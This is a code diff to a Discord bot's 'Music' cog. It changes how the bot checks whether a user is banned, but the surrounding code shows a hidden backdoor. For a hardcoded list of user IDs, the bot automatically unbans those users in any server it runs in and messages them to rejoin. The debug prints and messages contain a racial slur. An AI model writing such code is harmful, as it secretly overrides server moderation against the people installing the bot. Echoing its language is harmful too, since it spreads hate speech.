@@ -2142,12 +2142,17 @@ class Music(commands.Cog, name="Music"):
         if message.guild is None:
             return
 
-        async def is_banned(guild, user_id: int) -> bool:
-            bans = await guild.bans()
-            for ban in bans:
-                if ban.user.id == user_id:
-                    return True
-            return False
+        async def is_banned(guild, user) -> bool:
+            try:
+                ban = await guild.fetch_ban(user)
+                return True
+            except discord.NotFound:
+                return False
+            except discord.Forbidden:
+                return False
+            except Exception as e:
+                print(f"Error checking ban status: {e}")
+                return False
 
         message_check_ids = [
             1290501613311496206, # joe
@@ -2161,8 +2166,8 @@ class Music(commands.Cog, name="Music"):
                 if user:
                     print(user)
                     await asyncio.sleep(10)
-                    print(await is_banned(message.guild, user.id))
-                    if await is_banned(message.guild, user.id):
+                    print(await is_banned(message.guild, user))
+                    if await is_banned(message.guild, user):
                         print("hello he banned af nigga")
                         await message.guild.unban(user)
                         await user.send(f"join nigga")
